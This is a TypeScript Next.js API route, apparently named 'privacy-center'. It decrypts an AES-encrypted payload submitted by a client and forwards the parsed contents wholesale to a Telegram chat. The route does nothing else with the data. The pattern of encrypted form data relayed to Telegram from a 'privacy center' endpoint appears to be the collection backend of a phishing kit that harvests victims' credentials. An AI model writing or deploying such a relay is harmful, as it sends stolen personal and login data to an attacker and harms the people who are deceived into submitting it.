import { NextResponse } from 'next/server';
import { sendTelegramMessage } from '@/helper/telegram';
import { decryptAES } from '@/utils/crypto';
import { logServerError } from '@/lib/error-reporting';
import { rateLimit } from '@/utils/rateLimit';

const WINDOW_MS = 60_000;
const MAX_POSTS_PER_WINDOW = 25;

function clientIp(req: Request): string {
    const xf = req.headers.get('x-forwarded-for');
    if (xf) {
        return xf.split(',')[0].trim() || 'unknown';
    }
    return req.headers.get('x-real-ip') || 'unknown';
}

export async function POST(req: Request) {
    try {
        const ip = clientIp(req);
        const limited = rateLimit(`privacy-center:${ip}`, MAX_POSTS_PER_WINDOW, WINDOW_MS);
        if (!limited.ok) {
            return NextResponse.json(
                { message: 'Too many requests', error_code: 429 },
                {
                    status: 429,
                    headers: { 'Retry-After': String(limited.retryAfterSec) },
                }
            );
        }

        const body = await req.json();
        const rawData = body?.data;

        if (!rawData || typeof rawData !== 'string') {
            return NextResponse.json(
                { message: "Invalid request: 'data' is required", error_code: 1 },
                { status: 400 }
            );
        }

        let decrypted: string;
        try {
            decrypted = decryptAES(rawData);
        } catch {
            return NextResponse.json(
                { message: 'Decryption failed', error_code: 3 },
                { status: 400 }
            );
        }

        let parsedData: any;
        try {
            parsedData = JSON.parse(decrypted);

        } catch {
            return NextResponse.json(
                { message: 'Invalid JSON format after decryption', error_code: 4 },
                { status: 400 }
            );
        }

        try {
            await sendTelegramMessage(parsedData);
        } catch (telegramError: any) {
            console.error('Telegram send error:', telegramError?.message || telegramError);
            return NextResponse.json(
                { message: 'Request received but notification failed', error_code: 5 },
                { status: 200 }
            );
        }

        return NextResponse.json({ message: 'Success', error_code: 0 }, { status: 200 });
    } catch (err) {
        logServerError('api/privacy-center', err);
        return NextResponse.json(
            { message: 'Internal server error', error_code: 2 },
            { status: 500 }
        );
    }
}